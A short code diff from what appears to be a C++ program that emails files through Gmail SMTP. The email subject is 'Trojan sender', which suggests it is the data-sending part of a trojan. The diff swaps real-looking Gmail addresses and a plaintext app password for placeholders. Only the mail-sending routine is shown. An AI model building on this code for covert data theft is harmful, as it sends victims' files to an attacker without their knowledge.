@@ -27,8 +27,8 @@ void send_email() {
     mailman.put_SmtpHost("smtp.gmail.com");
 
     // Set the SMTP login/password for the Gmail account
-    mailman.put_SmtpUsername("annotshy@gmail.com");
-    mailman.put_SmtpPassword("mysecretapppassword");
+    mailman.put_SmtpUsername("sender@gmail.com");
+    mailman.put_SmtpPassword("app-password-for-sender-email");
 
     // Connect to SMTP port 465 using TLS.
     mailman.put_SmtpSsl(true);
@@ -39,10 +39,10 @@ void send_email() {
 
     email.put_Subject("Trojan sender");
     email.put_Body("#");
-    email.put_From("Anonymous Sender <annotshy@gmail.com>");
+    email.put_From("Anonymous Sender <sender@gmail.com>");
     
     // Add the recipient
-    bool success = email.AddTo("Recipient Name", "anonymous.sudoer@gmail.com");
+    bool success = email.AddTo("Recipient Name", "receiver@gmail.com");
     if (!success) {
         cerr << email.lastErrorText() << "\r\n";
         return;
@@ -72,8 +72,6 @@ void send_email() {
     if (success != true) {
         cerr << "Connection to SMTP server not closed cleanly." << "\r\n";
     }
-
-    // cout << "Mail with attachments sent!" << "\r\n";
 }
 
 int main() {
